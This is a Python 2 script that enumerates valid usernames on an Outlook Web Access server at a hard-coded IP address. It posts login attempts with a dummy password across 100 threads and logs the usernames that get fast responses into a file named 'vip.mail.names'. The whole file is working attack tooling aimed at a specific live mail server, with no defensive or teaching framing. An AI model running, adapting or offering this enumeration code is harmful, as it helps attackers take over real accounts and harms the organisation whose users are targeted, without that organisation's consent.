# !/usr/bin/env python
# -*- coding:utf-8 -*-

import Queue
import threading
import time
import requests
import MySQLdb
import re

#x=open("test.db").readlines()
#print x
'''
configure option
'''
HOSTS_FILE="names"
SENSITIVE_FILE="names"
hosts=open(HOSTS_FILE).readlines()
files=open(SENSITIVE_FILE).readlines()
requests.adapters.DEFAULT_RETRIES = 3
headers={"Host":"121.32.130.126","User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Referer":"https://121.32.130.126/owa/auth/logon.aspx?replaceCurrent=1&reason=2&url=https%3a%2f%2f121.32.130.126%2fowa%2f","Content-Type":"application/x-www-form-urlencoded","Content-Length":"130"}

testx=0

x=Queue.Queue()

class WorkManager(object):
    def __init__(self, work_num=1000,thread_num=2):
        self.work_queue = Queue.Queue()
        self.threads = []
        self.__init_work_queue(work_num)
        self.__init_thread_pool(thread_num)


    def __init_thread_pool(self,thread_num):
        for i in range(thread_num):
            self.threads.append(Work(self.work_queue))

    def __init_work_queue(self, jobs_num):
        for i in range(jobs_num):
            self.add_job(do_job, i)

    def add_job(self, func, *args):
        self.work_queue.put((func, list(args)))
    def wait_allcomplete(self):
        for item in self.threads:
            if item.isAlive():item.join()

class Work(threading.Thread):
    def __init__(self, work_queue):
        threading.Thread.__init__(self)
        self.work_queue = work_queue
        self.start()

    def run(self):
        while True:
            try:
                do, args = self.work_queue.get(block=False)
                do(args)
                self.work_queue.task_done()
            except Exception,e:
		#DEBUG HERE
		#print e
                break
def do_job(args):
    #time.sleep(0.1)
    #print threading.current_thread(), list(args)
    start=time.time()
    payload="destination=https://121.32.130.126/owa/&flags=4&forcedownlevel=0&username="+files[args[0]].strip("\r").strip("\n")+"&password=a&passwordText=&isUtf8=1"
    r=requests.post("https://121.32.130.126/owa/auth.owa",data=payload,verify=False,headers=headers,allow_redirects=False)
    end=time.time()
    if end-start<3:
        print files[args[0]].strip("\r").strip("\n"),":",end-start
        x.put((files[args[0]].strip("\r").strip("\n"),end-start,r.status_code,r.text))

if __name__ == '__main__':
    start = time.time()
    work_manager =  WorkManager(len(hosts), 100)
    work_manager.wait_allcomplete()
    end = time.time()
    print "cost all time: %s" % (end-start)
    f=open("vip.mail.names",'a+')
    while x.empty()==False:
        f.write(str(x.get())+"\n")
